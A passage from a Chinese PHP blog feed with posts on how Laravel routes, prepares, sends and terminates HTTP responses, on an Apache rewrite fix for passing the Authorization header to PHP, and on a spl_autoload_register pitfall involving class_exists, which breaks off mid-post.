class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 路由处理请求的入库</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRoute</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runRoute($request, <span class="keyword">$this</span>-&gt;findRoute($request));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据请求的 url 和 method 查找对应的 route</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">findRoute</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;current = $route = <span class="keyword">$this</span>-&gt;routes-&gt;match($request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;container-&gt;instance(Route::class, $route);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $route;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据对应的请求和路由条目, 返回相应的 $response</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRoute</span><span class="params">(Request $request, Route $route)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $request-&gt;setRouteResolver(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $route;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">new</span> Events\RouteMatched($route, $request));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse($request,</span><br><span class="line">                                  <span class="keyword">$this</span>-&gt;runRouteWithinStack($route, $request)</span><br><span class="line">                                 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求经过路由中间件过滤后, 交由 route 的 run() 方法处理</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRouteWithinStack</span><span class="params">(Route $route, Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $shouldSkipMiddleware = <span class="keyword">$this</span>-&gt;container-&gt;bound(<span class="string">'middleware.disable'</span>) &amp;&amp;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;container-&gt;make(<span class="string">'middleware.disable'</span>) === <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    $middleware = $shouldSkipMiddleware ? [] : <span class="keyword">$this</span>-&gt;gatherRouteMiddleware($route);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline(<span class="keyword">$this</span>-&gt;container))</span><br><span class="line">        -&gt;send($request)</span><br><span class="line">        -&gt;through($middleware)</span><br><span class="line">        -&gt;then(<span class="function"><span class="keyword">function</span> <span class="params">($request)</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse(</span><br><span class="line">                $request, $route-&gt;run()</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>route</code> 的 <code>run()</code> 方法最终将请求转给 <code>Illuminate\Routing\ControllerDispatcher::dispatch</code> 处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(Route $route, $controller, $method)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $parameters = <span class="keyword">$this</span>-&gt;resolveClassMethodDependencies(</span><br><span class="line">    $route-&gt;parametersWithoutNulls(), $controller, $method</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method_exists($controller, <span class="string">'callAction'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> $controller-&gt;callAction($method, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $controller-&gt;&#123;$method&#125;(...array_values($parameters));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下的事情就是 Controller控制器 的事了.</p><h3 id="3-3-处理返回的-Response"><a href="#3-3-处理返回的-Response" class="headerlink" title="3.3 处理返回的 Response"></a>3.3 处理返回的 Response</h3><p>在 <code>Router</code> 中有一个方法, 用于对返回的 <code>$response</code> 进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareResponse</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::toResponse($request, $response);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Illuminate\Http\Response|\Illuminate\Http\JsonResponse</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">toResponse</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($response <span class="keyword">instanceof</span> Responsable) &#123;</span><br><span class="line">        $response = $response-&gt;toResponse($request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($response <span class="keyword">instanceof</span> PsrResponseInterface) &#123;</span><br><span class="line">        $response = (<span class="keyword">new</span> HttpFoundationFactory)-&gt;createResponse($response);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (! $response <span class="keyword">instanceof</span> SymfonyResponse &amp;&amp;</span><br><span class="line">              ($response <span class="keyword">instanceof</span> Arrayable ||</span><br><span class="line">               $response <span class="keyword">instanceof</span> Jsonable ||</span><br><span class="line">               $response <span class="keyword">instanceof</span> ArrayObject ||</span><br><span class="line">               $response <span class="keyword">instanceof</span> JsonSerializable ||</span><br><span class="line">               is_array($response))) &#123;</span><br><span class="line">        $response = <span class="keyword">new</span> JsonResponse($response);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (! $response <span class="keyword">instanceof</span> SymfonyResponse) &#123;</span><br><span class="line">        $response = <span class="keyword">new</span> Response($response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($response-&gt;getStatusCode() === Response::HTTP_NOT_MODIFIED) &#123;</span><br><span class="line">        $response-&gt;setNotModified();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response-&gt;prepare($request);<span class="comment"># 最后的处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述过程中, 在返回 <code>$response</code> 之前进行了最后的处理 <code>$response-&gt;prepare($request)</code></p><p>该过程是在 <code>Symfony\Component\HttpFoundation\Response::prepare()</code> 中进行</p><blockquote><p>对响应的封装是通过 <code>Illuminate\Http\Response</code> 类完成, 该类底层是 Symfony 框架的 Response 类</p></blockquote><blockquote><p>即, Symfony\Component\HttpFoundation\Response</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $headers = <span class="keyword">$this</span>-&gt;headers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isInformational() || <span class="keyword">$this</span>-&gt;isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setContent(<span class="keyword">null</span>);</span><br><span class="line">        $headers-&gt;remove(<span class="string">'Content-Type'</span>);</span><br><span class="line">        $headers-&gt;remove(<span class="string">'Content-Length'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Content-type based on the Request</span></span><br><span class="line">        <span class="keyword">if</span> (!$headers-&gt;has(<span class="string">'Content-Type'</span>)) &#123;</span><br><span class="line">            $format = $request-&gt;getRequestFormat();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> !== $format &amp;&amp; $mimeType = $request-&gt;getMimeType($format)) &#123;</span><br><span class="line">                $headers-&gt;set(<span class="string">'Content-Type'</span>, $mimeType);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fix Content-Type</span></span><br><span class="line">        $charset = <span class="keyword">$this</span>-&gt;charset ?: <span class="string">'UTF-8'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!$headers-&gt;has(<span class="string">'Content-Type'</span>)) &#123;</span><br><span class="line">            $headers-&gt;set(<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset='</span>.$charset);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="number">0</span> === stripos($headers-&gt;get(<span class="string">'Content-Type'</span>), <span class="string">'text/'</span>) &amp;&amp; <span class="keyword">false</span> === stripos($headers-&gt;get(<span class="string">'Content-Type'</span>), <span class="string">'charset'</span>)) &#123;</span><br><span class="line">            <span class="comment">// add the charset</span></span><br><span class="line">            $headers-&gt;set(<span class="string">'Content-Type'</span>, $headers-&gt;get(<span class="string">'Content-Type'</span>).<span class="string">'; charset='</span>.$charset);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fix Content-Length</span></span><br><span class="line">        <span class="keyword">if</span> ($headers-&gt;has(<span class="string">'Transfer-Encoding'</span>)) &#123;</span><br><span class="line">            $headers-&gt;remove(<span class="string">'Content-Length'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;isMethod(<span class="string">'HEAD'</span>)) &#123;</span><br><span class="line">            <span class="comment">// cf. RFC2616 14.13</span></span><br><span class="line">            $length = $headers-&gt;get(<span class="string">'Content-Length'</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setContent(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> ($length) &#123;</span><br><span class="line">                $headers-&gt;set(<span class="string">'Content-Length'</span>, $length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fix protocol</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'HTTP/1.0'</span> != $request-&gt;server-&gt;get(<span class="string">'SERVER_PROTOCOL'</span>)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setProtocolVersion(<span class="string">'1.1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if we need to send extra expire info headers</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'1.0'</span> == <span class="keyword">$this</span>-&gt;getProtocolVersion() &amp;&amp; <span class="keyword">false</span> !== strpos(<span class="keyword">$this</span>-&gt;headers-&gt;get(<span class="string">'Cache-Control'</span>), <span class="string">'no-cache'</span>)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers-&gt;set(<span class="string">'pragma'</span>, <span class="string">'no-cache'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers-&gt;set(<span class="string">'expires'</span>, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;ensureIEOverSSLCompatibility($request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-响应发送和程序终止"><a href="#4-响应发送和程序终止" class="headerlink" title="4. 响应发送和程序终止"></a>4. 响应发送和程序终止</h2><h3 id="4-1-响应的发送"><a href="#4-1-响应的发送" class="headerlink" title="4.1 响应的发送"></a>4.1 响应的发送</h3><p>在 <code>index.php</code> 入口文件的最后是将响应返回给客户端</p><blockquote><p>$response-&gt;send();</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Symfony\Component\HttpFoundation\Response</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sendHeaders();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sendContent();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (function_exists(<span class="string">'fastcgi_finish_request'</span>)) &#123;</span><br><span class="line">        fastcgi_finish_request();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!\in_array(PHP_SAPI, <span class="keyword">array</span>(<span class="string">'cli'</span>, <span class="string">'phpdbg'</span>), <span class="keyword">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">static</span>::closeOutputBuffers(<span class="number">0</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendHeaders</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// headers have already been sent by the developer</span></span><br><span class="line">    <span class="keyword">if</span> (headers_sent()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// headers</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;headers-&gt;allPreserveCase() <span class="keyword">as</span> $name =&gt; $values) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($values <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            header($name.<span class="string">': '</span>.$value, <span class="keyword">false</span>, <span class="keyword">$this</span>-&gt;statusCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// status</span></span><br><span class="line">    header(sprintf(<span class="string">'HTTP/%s %s %s'</span>, <span class="keyword">$this</span>-&gt;version, <span class="keyword">$this</span>-&gt;statusCode, <span class="keyword">$this</span>-&gt;statusText), <span class="keyword">true</span>, <span class="keyword">$this</span>-&gt;statusCode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendContent</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-请求中止"><a href="#4-2-请求中止" class="headerlink" title="4.2 请求中止"></a>4.2 请求中止</h3><p>在 <code>index.php</code> 入口文件的最后:</p><blockquote><p>\$kernel-&gt;terminate( \$request, \$response );</p></blockquote><p>依旧以 Http Kernel 为例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">terminate</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;terminateMiddleware($request, $response);<span class="comment"># 中间件中止处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;terminate();<span class="comment"># 服务容器的中止处理函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">terminateMiddleware</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $middlewares = <span class="keyword">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : array_merge(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;gatherRouteMiddleware($request),</span><br><span class="line">        <span class="keyword">$this</span>-&gt;middleware</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($middlewares <span class="keyword">as</span> $middleware) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_string($middleware)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>($name) = <span class="keyword">$this</span>-&gt;parseMiddleware($middleware);</span><br><span class="line"></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;make($name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method_exists($instance, <span class="string">'terminate'</span>)) &#123;</span><br><span class="line">            $instance-&gt;terminate($request, $response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的中间件指的是定义在 Kernel 中的 <code>$middleware</code> 中间件数组列表, 不包含 路由中间件.</p><blockquote><p>Laravel 5.1 注: 默认只有会话中间件包含 terminate() 函数</p></blockquote><p><code>Application</code> 服务容器的中止处理函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">terminate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;terminatingCallbacks <span class="keyword">as</span> $terminating) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call($terminating);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-程序启动准备&quot;&gt;&lt;a href=&quot;#1-程序启动准备&quot; class=&quot;headerlink&quot; title=&quot;1. 程序启动准备&quot;&gt;&lt;/a&gt;1. 程序启动准备&lt;/h2&gt;&lt;p&gt;程序入口在 index.php 中&lt;/p&gt;
&lt;figure class=&quot;highlig
      
    
    </summary>
    
      <category term="PHP" scheme="http://ya2.top/categories/PHP/"/>
    
    
      <category term="Laravel" scheme="http://ya2.top/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>HTTP_AUTHORIZATION</title>
    <link href="http://ya2.top/articles/HTTP-AUTHORIZATION/"/>
    <id>http://ya2.top/articles/HTTP-AUTHORIZATION/</id>
    <published>2021-01-25T11:31:47.000Z</published>
    <updated>2021-06-16T02:23:03.491Z</updated>
    
    <content type="html"><![CDATA[<p>做接口认证的时候，我们常会采用<code>Http BearerAuth</code>认证方式，即请求时在Header带上Authorization参数：</p><blockquote><p>Authorization: Bearer your_token</p></blockquote><p>我们都知道php的自定义头信息都可以使用<code>$SERVER[&#39;HTTP*&#39;]</code>来获取, 如 “Cookie: BAIDUID=B86A8A0FF:”, 获取的时候，我们可以使用<code>$_SERVER[&#39;HTTP_COOKIE&#39;]</code>来获取。</p><p>但<code>Authorization</code>是个例外，在<code>Apache服务器</code>下会出现<code>$_SERVER[&#39;HTTP_AUTHORIZATION&#39;]</code> 获取不到值的问题.</p><p>解决方法如下: </p><ul><li>如果已经开启<code>rewrite_module</code>模块，需要在<code>httpd-vhosts.conf</code>模块下</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName test.com</span><br><span class="line">    DocumentRoot <span class="string">"/data/www/"</span></span><br><span class="line">    &lt;Directory  <span class="string">"/data/www/"</span>&gt;</span><br><span class="line">        <span class="comment"># Laravel配置</span></span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">AllowOverride All</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Require all granted</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">RewriteRule ^ index.php [L]</span><br><span class="line"><span class="comment"># HTTP 基础认证需要添加下面两行</span></span><br><span class="line">RewriteCond %&#123;HTTP:Authorization&#125; ^(.+)$</span><br><span class="line">RewriteRule .* - [E=HTTP_AUTHORIZATION:%&#123;HTTP:Authorization&#125;]</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><ul><li>如果没有开启<code>rewrite_module</code>模块，需要在入口处添加<code>.htaccess</code>文件，内容如下:</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Options +FollowSymlinks -Multiviews</span><br><span class="line">RewriteEngine On</span><br><span class="line"><span class="comment">#Authorization Headers</span></span><br><span class="line">RewriteCond %&#123;HTTP:Authorization&#125; ^(.+)$</span><br><span class="line">RewriteRule .* - [E=HTTP_AUTHORIZATION:%&#123;HTTP:Authorization&#125;]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;做接口认证的时候，我们常会采用&lt;code&gt;Http BearerAuth&lt;/code&gt;认证方式，即请求时在Header带上Authorization参数：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Authorization: Bearer your_token&lt;/p&gt;
&lt;/
      
    
    </summary>
    
      <category term="PHP" scheme="http://ya2.top/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次spl_autoload_register踩坑</title>
    <link href="http://ya2.top/articles/%E8%AE%B0%E4%B8%80%E6%AC%A1spl-autoload-register%E8%B8%A9%E5%9D%91/"/>
    <id>http://ya2.top/articles/记一次spl-autoload-register踩坑/</id>
    <published>2020-11-16T10:16:15.000Z</published>
    <updated>2021-06-16T02:21:41.392Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>定义： spl_autoload_register – 注册给定的函数作为 <a href="https://www.php.net/manual/zh/function.autoload" target="_blank" rel="noopener">__autoload</a> 的实现 <a href="https://www.php.net/manual/zh/function.spl-autoload-register.php" target="_blank" rel="noopener">【官方文档】</a></p></blockquote><p>简单说就是当我们使用未引用的类时会触发这个函数执行，例如：</p><p><img src="/articles/记一次spl-autoload-register踩坑/demo.png" alt="示例1"></p><p>根据这个特性，我们可以实现自动的类加载功能，例如:</p><p><img src="/articles/记一次spl-autoload-register踩坑/demo2.png" alt="示例2"></p><p>一切看起来都是如此美好，但是问题来了，在测试中我发现如下问题：</p><p><img src="/articles/记一次spl-autoload-register踩坑/demo3.png" alt="坑"></p><p>虽然成功加载了目标类，但是spl_autoload_register被触发了两次，外部实例化类的地方只有一处，显然这是不正常的（红框内的类按照处理逻辑是不应该被加载的）。</p><p>经查发现出问题的函数是 <a href="https://www.php.net/manual/zh/function.class-exists" target="_blank" rel="noopener">class_exists</a>：</p><p><img src="/articles/记一次spl-autoload-register踩坑/class_exists.png" alt="class_exists"></p><p>它的第二个参数 <code>autoload</code> 默认是 <code>true</code>, 这就导致如果指定的类 <code>$class_name</code> 不存在就会触发<a href="https://www.php.net/manual/zh/function.autoload" target="_blank" rel="noopener">__autoload</a>, 而spl_autoload_register是<a href="https://www.php.net/manual/zh/function.autoload" target="_blank" rel="noopener">__autoload</a>的实现,所以spl_autoload_register就被触发了。</p><p>解决方法也简单，就是在指定参数autoload为false即可：</p><p><img src="/articles/记一次spl-autoload-register踩坑/demo4.png" alt="示例3"></p><p><em>注意此处的Demo是放在test目录下面的，和上面示例12Demo放同级目录不同</em></p><p>类似的常用方法还有： <code>class_alias</code>, <code>trait_exists</code>,<code>interface_exists</code> 等。</p><p>细心的大佬可能会发现在官方文档里面已经有人提出这个问题了：</p><p><img 